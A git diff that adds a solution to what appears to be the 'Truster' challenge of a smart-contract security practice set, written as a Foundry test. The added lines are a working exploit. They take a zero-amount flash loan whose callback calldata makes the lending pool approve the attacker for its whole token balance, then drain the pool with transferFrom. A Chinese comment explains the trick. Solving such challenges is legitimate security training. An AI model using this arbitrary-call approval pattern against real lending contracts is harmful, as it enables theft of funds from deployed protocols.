@@ -41,6 +41,13 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        // 寫到一半突然想到，既然餘額不能動，但拿到了執行權利 + 合約本身能當 msg.sender，就突然想到可以採取 approve 再 safeTransferFrom
+        trusterLenderPool.flashLoan(
+            0, attacker, address(dvt), abi.encodeWithSelector(dvt.approve.selector, attacker, TOKENS_IN_POOL)
+        );
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
